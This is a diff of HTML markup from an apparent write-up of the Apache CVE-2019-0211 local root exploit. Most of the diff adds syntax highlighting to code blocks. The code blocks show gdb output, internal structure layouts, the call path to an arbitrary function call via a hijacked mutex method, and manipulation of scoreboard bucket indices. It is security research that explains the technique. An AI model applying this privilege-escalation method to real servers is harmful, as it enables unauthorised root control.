+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;ap_scoreboard_image&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;parent&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;process_score&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x7f4a9323e020&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;ap_scoreboard_image&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;parent&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;process_score&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x7f4a9323e044&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;To locate &lt;code&gt;all_buckets&lt;/code&gt;, we can make use of our knowledge of the &lt;code&gt;prefork_child_bucket&lt;/code&gt; structure. We have:&lt;/p&gt;
 &lt;p&gt;&lt;em&gt;Important structures of bucket items&lt;/em&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;prefork_child_bucket {
-    ap_pod_t *pod;
-    ap_listen_rec *listeners;
-    apr_proc_mutex_t *mutex; &amp;lt;--
-}
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;prefork_child_bucket&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;ap_pod_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;pod&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="n"&gt;ap_listen_rec&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;listeners&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="n"&gt;apr_proc_mutex_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;mutex&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;span class="err"&gt;}&lt;/span&gt;
 
-apr_proc_mutex_t {
-    apr_pool_t *pool;
-    const apr_proc_mutex_unix_lock_methods_t *meth; &amp;lt;--
-    int curr_locked;
-    char *fname;
+&lt;span class="n"&gt;apr_proc_mutex_t&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;apr_pool_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;pool&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="n"&gt;const&lt;/span&gt; &lt;span class="n"&gt;apr_proc_mutex_unix_lock_methods_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;meth&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+    &lt;span class="nb"&gt;int&lt;/span&gt; &lt;span class="n"&gt;curr_locked&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nb"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;fname&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 
-    ...
-}
+    &lt;span class="p"&gt;...&lt;/span&gt;
+&lt;span class="err"&gt;}&lt;/span&gt;
 
-apr_proc_mutex_unix_lock_methods_t {
-    unsigned int flags;
-    apr_status_t (*create)(apr_proc_mutex_t *, const char *);
-    apr_status_t (*acquire)(apr_proc_mutex_t *);
-    apr_status_t (*tryacquire)(apr_proc_mutex_t *);
-    apr_status_t (*release)(apr_proc_mutex_t *);
-    apr_status_t (*cleanup)(void *);
-    apr_status_t (*child_init)(apr_proc_mutex_t **, apr_pool_t *, const char *); &amp;lt;--
-    apr_status_t (*perms_set)(apr_proc_mutex_t *, apr_fileperms_t, apr_uid_t, apr_gid_t);
-    apr_lockmech_e mech;
-    const char *name;
-}
+&lt;span class="n"&gt;apr_proc_mutex_unix_lock_methods_t&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;unsigned&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt; &lt;span class="n"&gt;flags&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="n"&gt;apr_status_t&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="k"&gt;create&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;apr_proc_mutex_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;const&lt;/span&gt; &lt;span class="nb"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;apr_status_t&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;acquire&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;apr_proc_mutex_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;apr_status_t&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;tryacquire&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;apr_proc_mutex_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;apr_status_t&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;release&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;apr_proc_mutex_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;apr_status_t&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;cleanup&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;void&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;apr_status_t&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;child_init&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;apr_proc_mutex_t&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;apr_pool_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;const&lt;/span&gt; &lt;span class="nb"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+    &lt;span class="n"&gt;apr_status_t&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;perms_set&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;apr_proc_mutex_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;apr_fileperms_t&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;apr_uid_t&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;apr_gid_t&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;apr_lockmech_e&lt;/span&gt; &lt;span class="n"&gt;mech&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="n"&gt;const&lt;/span&gt; &lt;span class="nb"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="err"&gt;}&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -233,25 +405,25 @@ apr_proc_mutex_unix_lock_methods_t {
 &lt;h2&gt;2. Write a fake &lt;code&gt;prefork_child_bucket&lt;/code&gt; structure in the SHM&lt;/h2&gt;
 &lt;h3&gt;Reaching the function call&lt;/h3&gt;
 &lt;p&gt;The code path to the arbitrary function call is the following:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;bucket_id = ap_scoreboard_image-&amp;gt;parent[id]-&amp;gt;bucket
-my_bucket = all_buckets[bucket_id]
-mutex = &amp;amp;my_bucket-&amp;gt;mutex
-apr_proc_mutex_child_init(mutex)
-(*mutex)-&amp;gt;meth-&amp;gt;child_init(mutex, pool, fname)
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;bucket_id&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ap_scoreboard_image&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;parent&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="o"&gt;]-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bucket&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="n"&gt;my_bucket&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;all_buckets&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;bucket_id&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="n"&gt;mutex&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;my_bucket&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;mutex&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="n"&gt;apr_proc_mutex_child_init&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mutex&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;mutex&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;meth&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;child_init&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mutex&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;pool&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fname&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;&lt;img alt="Call:reach" src="images/carpe-diem-cve-2019-0211-apache-local-root/1.png"&gt;&lt;/p&gt;
 &lt;h3&gt;Calling something proper&lt;/h3&gt;
 &lt;p&gt;To exploit, we make &lt;code&gt;(*mutex)-&amp;gt;meth-&amp;gt;child_init&lt;/code&gt; point to &lt;code&gt;zend_object_std_dtor(zend_object *object)&lt;/code&gt;, which yields the following chain:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mutex = &amp;amp;my_bucket-&amp;gt;mutex
-[object = mutex]
-zend_object_std_dtor(object)
-ht = object-&amp;gt;properties
-zend_array_destroy(ht)
-zend_hash_destroy(ht)
-val = &amp;amp;ht-&amp;gt;arData[0]-&amp;gt;val
-ht-&amp;gt;pDestructor(val)
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;mutex&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;my_bucket&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;mutex&lt;/span&gt;
+&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="k"&gt;object&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mutex&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="n"&gt;zend_object_std_dtor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;object&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;ht&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;object&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;properties&lt;/span&gt;
+&lt;span class="n"&gt;zend_array_destroy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ht&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;zend_hash_destroy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ht&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;val&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;ht&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;arData&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;val&lt;/span&gt;
+&lt;span class="n"&gt;ht&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;pDestructor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;val&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -279,9 +451,9 @@ Now, if &lt;code&gt;all_bucket&lt;/code&gt; is relocated not too far from its or
 &lt;h3&gt;Using every &lt;code&gt;process_score&lt;/code&gt;&lt;/h3&gt;
 &lt;p&gt;Each Apache worker has an associated &lt;code&gt;process_score&lt;/code&gt; structure, and with it a &lt;code&gt;bucket&lt;/code&gt; index.
 Instead of changing one &lt;code&gt;process_score.bucket&lt;/code&gt; value, we can change every one of them, so that they cover another part of memory. For instance:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ap_scoreboard_image-&amp;gt;parent[0]-&amp;gt;bucket = -10000 -&amp;gt; 0x7faabbcc00 &amp;lt;= all_buckets &amp;lt;= 0x7faabbdd00
-ap_scoreboard_image-&amp;gt;parent[1]-&amp;gt;bucket = -20000 -&amp;gt; 0x7faabbdd00 &amp;lt;= all_buckets &amp;lt;= 0x7faabbff00
-ap_scoreboard_image-&amp;gt;parent[2]-&amp;gt;bucket = -30000 -&amp;gt; 0x7faabbff00 &amp;lt;= all_buckets &amp;lt;= 0x7faabc0000
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;ap_scoreboard_image&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;parent&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bucket&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;10000&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x7faabbcc00&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;all_buckets&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x7faabbdd00&lt;/span&gt;
+&lt;span class="n"&gt;ap_scoreboard_image&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;parent&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bucket&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;20000&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x7faabbdd00&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;all_buckets&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x7faabbff00&lt;/span&gt;
+&lt;span class="n"&gt;ap_scoreboard_image&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;parent&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bucket&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;30000&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x7faabbff00&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;all_buckets&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x7faabc0000&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
